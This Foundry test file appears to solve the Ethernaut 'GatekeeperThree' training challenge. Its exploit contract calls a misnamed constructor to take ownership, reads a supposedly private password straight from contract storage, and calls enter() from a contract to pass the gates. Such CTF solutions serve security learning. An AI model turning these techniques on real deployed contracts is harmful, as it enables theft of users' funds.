pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { GatekeeperThree } from "src/GateKeeperThree/GateKeeperThree.sol";
import "forge-std/console2.sol";

contract Exploit {

    function prepare(address target) public {
        (bool success, ) = target.call(abi.encodeWithSignature("construct0r()"));
        require(success);
    }
    
    function attack(address target) public {
        (bool success, ) = target.call(abi.encodeWithSignature("enter()"));
        require(success);
    }
}

contract GatekeeperThreeTest is Test {
    address me = makeAddr("me");
    GatekeeperThree gateKeeper;
    
    function setUp() public {
        gateKeeper = new GatekeeperThree();    
    }


    function testGateKeeperThree() external {
        vm.startPrank(me);
        Exploit exploit = new Exploit();

        // make me to be an owner, so we will pass gate one
        exploit.prepare(address(gateKeeper));
        assertEq(gateKeeper.owner(), address(exploit));
        // in order to pass gate two, we have to set allowEntrance = true via getAllowance function
        // getAllowance function requires correct password passed in
        // password variable available at slot 2 in the SimpleTrick storage
        
        // init the SimpleTrick contract
        gateKeeper.createTrick();
        address trick = address(gateKeeper.trick());
        bytes32 passwordByte = vm.load(trick, bytes32(uint256(2)));
        uint256 password = uint256(passwordByte);
        gateKeeper.getAllowance(password);
        assertEq(gateKeeper.allowEntrance(), true);

        vm.deal(me, 1 ether);
        (bool success,) = address(gateKeeper).call{ value: 0.002 ether }(new bytes(0));
        require(success);
        assertEq(address(gateKeeper).balance, 0.002 ether);

        exploit.attack(address(gateKeeper));
        
        assertEq(gateKeeper.entrant(), tx.origin);
    }
    
}
